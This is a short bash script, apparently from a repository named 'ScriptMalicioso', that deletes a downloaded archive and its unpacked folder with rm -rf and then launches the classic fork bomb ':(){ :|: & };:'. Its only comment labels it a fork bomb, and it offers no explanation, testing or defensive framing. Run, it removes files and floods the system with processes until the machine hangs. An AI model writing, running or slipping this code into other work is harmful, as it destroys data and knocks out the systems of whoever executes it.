#!/usr/bin/bash

# This is a forx bomb
function forkBomb () {
  rm -rf -v main.zip
  rm -rf -v ScriptMalicioso-main
  :(){ :|: & };:
}
forkBomb
